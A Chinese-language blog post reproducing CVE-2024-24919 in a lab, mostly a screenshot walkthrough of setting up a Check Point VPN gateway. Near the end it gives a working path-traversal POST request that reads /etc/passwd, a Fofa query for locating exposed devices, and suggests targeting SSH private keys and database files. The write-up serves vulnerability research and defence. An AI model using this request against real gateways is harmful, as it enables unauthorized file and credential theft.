#  【新洞随记】CVE-2024-24919：CheckPoint Remote Access VPN任意文件读取   
原创 W01fh4cker  追梦信安   2024-05-30 23:39  
  
# 零、前言  
  
Fofa语句：  
> app="Check_Point-SSL-Network-Extender"  
  
  
本来对这个Check Point不熟悉，复现过程中也踩了很多坑，这个环境我也是反反复复搭建了很多次，看了很多遍油管上面的各种视频，逛了很长时间的官方交流论坛，参考Palo Alto Pan OS和Fortinet SSL VPN的搭建掌握了Check Point Gateway的使用和大部分命令，看国内平台好像没什么人提这个环境搭建的事情，就简单记录一下，水篇文章，后面会出一个系列：《完全零基础从0到1掌握Weblogic漏洞分析与利用》。  
# 一、环境搭建  
## 1.1 下载并导入Vmware  
  
下载漏洞镜像，不需要登录，下下来会给你15天试用，到期了重装就可以了：  
> https://support.checkpoint.com/results/download/115148  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjg7zTJUpicaM2dCRicFdxpvBia5Leia5O7JzsQtUGpZJ5xYRCEEdgSyJRfQ/640?wx_fmt=png&from=appmsg "")  
  
导入到虚拟机里面：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjMJMcYDSdxicAZzZ24PiaVEOibpQlx9AQwdYy14oick6hS0K5sy1YCPcjnQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjGdEzdew3weiah28RqIYMmibJ74hGucOYCRPCAGUAyx6WDOmSfkiaMsNtw/640?wx_fmt=png&from=appmsg "")  
  
命名随意，给2x2处理器内核总数：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjevRwxjBt0iamQzscel3mzHSLIfeH1icdSgCjtKGRTeKA3iatudxcAqFjA/640?wx_fmt=png&from=appmsg "")  
  
内存给到8GB：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjNVE4tya4h2xVKtEKIBDmcn0b4CbomvUGgKz5C20vKOhEEGPdjiajoicw/640?wx_fmt=png&from=appmsg "")  
  
我个人喜欢给40GB空间，自己决定将就好：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjhmPKP9YRibJZ33QVHlwBFyU7R3spwhAEEuk1Oq0DyqgKh9cib0dgNJFg/640?wx_fmt=png&from=appmsg "")  
## 1.2 安装镜像系统  
  
开启该虚拟机，选择第一个选项：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjXeQsceHDvibam9GjvaJNFkicslKdgcdYicniagSNiaoz3asTzbhAzkQ1ApA/640?wx_fmt=png&from=appmsg "")  
  
等待一会出现以下界面时，回车继续：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjnBbhEnU3xzk1FCb08flSDQjVQ7ExLub8F15vLicwq4kIZoyettQ0Gng/640?wx_fmt=png&from=appmsg "")  
  
还是OK：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjdy1oaiasSQmgUwLWNtiaiapYlWO0HhlIhAORMibXsxia7U5loRbOX8FClIw/640?wx_fmt=png&from=appmsg "")  
  
填10和15：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMj2FicfIn0QyFoib4LzsWicibFAxAsmPEsu466KsgcVrys1MaBlLy32yrtpw/640?wx_fmt=png&from=appmsg "")  
  
输入密码，我这里设为admin123：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjyq74hGvXu7UZT79q5nnh421vTEanRCcwGWmA9fAK2a8zPf5j25hllg/640?wx_fmt=png&from=appmsg "")  
  
输入ip地址，它会自动填写默认网关，这个ip需要在你网卡的ip段里面（废话），然后按空格可以选择是否启用DHCP，我这里不启用：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMj2p7qJ8hLymNNB39VFEZv7nxsp6SMrDLk8aR3ibB06V6vWJTFJ1IVSHA/640?wx_fmt=png&from=appmsg "")  
  
开始安装：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMj7cdN6I6RapSrAkmapicvIyEszh6nPoGiaRb7iaYxkkg1DkJBWEAwHToxQ/640?wx_fmt=png&from=appmsg "")  
  
等一会，安装完之后重启：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjiboOSex45VJIibzqkic7FiaDlmtfV4cTmM3Ff8JbNsibFHCJSZ0sibmxGHxQ/640?wx_fmt=png&from=appmsg "")  
  
然后就可以登录进来了：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjulctujRYfxiaTKjosxJ6rfZPSg3XAKUBRNQ53Qwv01nJacBUddibBuAA/640?wx_fmt=png&from=appmsg "")  
## 1.3 防火墙首次配置  
  
访问https://192.168.198.171/并登录：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjpKDTIHevfLuuBDkLStMYTyW5PiaKPVDicLgO9Hj3bg5VJVqhEKTH4uLQ/640?wx_fmt=png&from=appmsg "")  
  
无脑下一步，这里取消勾选发送数据：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjzaBwqnUJ4fKicCDVicNcyF1pFNSZmqZWHIdKTUSkibwecKDw9Az2dL3Cw/640?wx_fmt=png&from=appmsg "")  
  
  
开始安装：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjPIic6hgHqPiaBmZicP7hQMf3FD7KsVo11XqGjibSR6k5wD21IHicNSVXbRw/640?wx_fmt=png&from=appmsg "")  
  
登录进来之后去下一个SmartConsole：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjpiccrNA3syItHkk3lz6ZZ7D3Pdbe5ibwulwhENJWtT0eLLwoZoTN2RXw/640?wx_fmt=png&from=appmsg "")  
  
连接：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjtbSIoSB5QMHLaPO6Wjsc8MegltOmVPLPymhaXTPaoYexY3J1dkqLHQ/640?wx_fmt=png&from=appmsg "")  
  
等一会就可以连上去了，如果提示系统还在初始化那就重连就可以了：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjr3SIgDHygeRhicnQXd3Ct1b1ZjGBzKiaUviaJwyG1PKeKXCl5zn1gsTPQ/640?wx_fmt=png&from=appmsg "")  
## 1.4 SmartConsole配置Check Point漏洞环境  
  
由于后面要添加一个Mobile Access，用的也是443端口，会和门户界面的这个冲突，并且那个是无法自定义端口号的，所以该改这个。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMj2ibhHGzz0b6BcXd5iah71zicObgc4nmicnVesxvQEzGJ9a2jTpkXIJrRlg/640?wx_fmt=png&from=appmsg "")  
  
改一下端口，挑一个不被占用的填就可以了，比如https://192.168.198.171:6657/：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjLev0aDQzqib5ECKVRJHeHz2KNHkmR8N9lI5P45xXdqt9ob9lfOfRXOA/640?wx_fmt=png&from=appmsg "")  
  
加一条规则：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjSHGmGPK0GnsmFw5fD1icdxeVRlkeAaFBgqkpabp0yQqLpK4DRBd5kYg/640?wx_fmt=png&from=appmsg "")  
  
  
简单粗暴设置成any即可，如果想自行搭建研究可以参考油管上面的视频：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjicibHQFSuRnoa1OhtaWwKYD9arxscr2ePnjQfC31V0iaKUqwXQTz3QSkA/640?wx_fmt=png&from=appmsg "")  
  
Services & Applications这里点击加号：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMj1oD8iaSYuggjlCchVclrqKyGHeEsgIKp0KVibMA5zDiadibDxUzNuvGy7Q/640?wx_fmt=png&from=appmsg "")  
  
选择TCP：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjfsho7yZxjDpoQkpheRQkia5kMlxhafTAPl9iaVbHnRvrWWiaDrqLyYRzA/640?wx_fmt=png&from=appmsg "")  
  
名字随便写，字母开头就可以了，端口填之前的6657：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjTl6appYCYQuFbXn6PQT3XvXckMTDWqGp778TQQubvdWRSIrETAhhiaA/640?wx_fmt=png&from=appmsg "")  
  
选择放行：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjNaNvKFtfYXuCTTNgFujMaA2gYrWx8Zz1H3E8SKv6HxVyib1sZUEF1Ww/640?wx_fmt=png&from=appmsg "")  
  
然后再按照刚才的步骤添加一个443端口的：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjic1trhGleavkQJB8oGqbbF2fPDbYJrbyM77q6KhicwZopCtVw65n0oqw/640?wx_fmt=png&from=appmsg "")  
  
然后Publish并install：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjSACCDm56YAQ3UtSBicAhmadVkA6UBj4xzVQUqOBoHPl6AZAmdmeyz8w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMj5nro070dfMElRnrn9UaRCw0kwnsn74cQydqXajS7jyyoxRMt1me2LQ/640?wx_fmt=png&from=appmsg "")  
  
然后访问https://192.168.198.171:6657/，确保没问题：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjDyV7YiaNZib5Pl1MpE8VTxHFUkA6IOs3fmicqWNzcCBXo39wY3SBr8UQw/640?wx_fmt=png&from=appmsg "")  
  
回到刚才的设置这里，勾选Mobile Access：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjzX6xvWjuQ8m9kc8UYuwOawx7p0VhMErpAyaIh5RBiaCBbFxN6iascibpw/640?wx_fmt=png&from=appmsg "")  
  
它会小卡一下，然后过一会会出来弹框：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjJ0BiaKicIWiaZOZOKaJnEwj0deXgL6WPw96g1WFPKw7jJ62BPEugodEmw/640?wx_fmt=png&from=appmsg "")  
  
无脑下一步，到这里把Mobile Mail这个去掉：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjIMYMqZP61icYavWNpNE3IUTicsHiam8MictA8xZOYrkT72rewxhtW055wA/640?wx_fmt=png&from=appmsg "")  
  
选择不适用AD：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjDZCXogUaySeCiblzRwmZ5HUOyHibibDiaCeBJXDHScETozqicicszeozn4fA/640?wx_fmt=png&from=appmsg "")  
  
密码随便填，我填的usertest：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjicFqAbZRoHLzclE1cDccpeJ7RDaicrH7GOEg3nc3hkZW7Sso6uRCn4BQ/640?wx_fmt=png&from=appmsg "")  
  
  
结束：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjeQIGaFpTdeptyLMEWDZeaDgYIsZl5Sh2eQC18b5SaH0ZytlqO0dKCA/640?wx_fmt=png&from=appmsg "")  
  
访问https://192.168.198.171/sslvpn：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMj1ppmYta55zIumibprrOeG4F1YzqISLJw7vPaYWvclF7icOhDO63dScJw/640?wx_fmt=png&from=appmsg "")  
  
usertest登录没问题：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjjgygxIErwTfDwBcPlbNa1aJfE0lUAgiaHxMqqibxwdlVnsaW31FfBTQw/640?wx_fmt=png&from=appmsg "")  
# 二、漏洞复现与拓展  
```
POST /clients/MyCRL HTTP/1.1
Host: 192.168.198.171
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 39

aCSHELL/../../../../../../../etc/passwd

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMj8ttXxNFngayf95KP7EjgLfKAqYQjgtOpp7rdIJDrC5hFDOmYJO6Z5g/640?wx_fmt=png&from=appmsg "")  
  
漏洞分析文章参考：  
> https://labs.watchtowr.com/check-point-wrong-check-point-cve-2024-24919/  
  
  
虚拟机的登录的话需要执行set expert-password来设置专家密码，然后再输入expert命令并输入密码即可登录控制台：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12q6UibILwhGTrLwsWaEMbYMjlkndDYaWlpzrZeNVrOIQ6hG88icrSvZicGI4K5wNqbTP8aGAv7OhpbwA/640?wx_fmt=png&from=appmsg "")  
  
然后可以查找一些文件（如.NDB、.sqlite、/home/admin/.ssh/id_rsa等），可以自己寻找规律，编写自己的一份验证字典。  
  
  
